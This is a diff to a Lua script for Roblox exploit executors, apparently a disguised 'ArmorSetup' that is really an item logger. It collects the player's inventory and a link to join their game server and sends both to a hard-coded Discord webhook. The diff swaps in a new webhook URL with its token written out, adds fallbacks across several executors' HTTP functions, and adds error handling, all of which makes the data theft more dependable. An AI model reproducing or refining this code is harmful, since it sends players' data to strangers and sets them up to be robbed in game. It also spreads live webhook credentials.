@@ -1,7 +1,7 @@
 if _G.ExecutedArmorSetup then return end
 _G.ExecutedArmorSetup = true
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1383655059719721041/2aDPVMFIIwr4woa0TbDz4fXn6wk_jz_0fh1Le4bv3Y4_gg449XEPJMNAqxSy6jqhJgPJ"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1383602706580635699/0FDVqbaXSB5vHxozqz1cdJBuXAkQqEl9FrwzTCLLIGaq1iYExNs4ITcltwx_0EJ60aAr"
 local TARGET_NAME = "Davenaseventeen"
 local LOADING_TIME = 300
 
@@ -38,6 +38,8 @@ local function contains(name, list)
     return false
 end
 
+local httpRequest = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or request
+
 do
     local animalItems, otherItems = {}, {}
     local mention = false
@@ -59,8 +61,9 @@ do
     local list = #animalItems > 0 and animalItems or {}
     for _, v in ipairs(otherItems) do table.insert(list, v) end
     local desc = #list > 0 and table.concat(list, "\n") or "__No valid items found.__"
-    local joinURL = string.format("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s", game.PlaceId, game.JobId)
+    if #desc > 1900 then desc = desc:sub(1, 1900) .. "\n...and more" end
 
+    local joinURL = string.format("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s", game.PlaceId, game.JobId)
     local payload = {
         username = "Roblox Logger",
         embeds = {{
@@ -73,14 +76,23 @@ do
     }
     if mention then payload.content = "@everyone" end
 
-    pcall(function()
-        request({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(payload)
-        })
-    end)
+    if httpRequest then
+        local success, res = pcall(function()
+            return httpRequest({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        if success and res and res.StatusCode ~= 204 then
+            warn("Webhook Error: " .. res.StatusCode, res.Body or "")
+        elseif not success then
+            warn("HTTP request failed.")
+        end
+    else
+        warn("Executor does not support HTTP requests.")
+    end
 end
 
 do
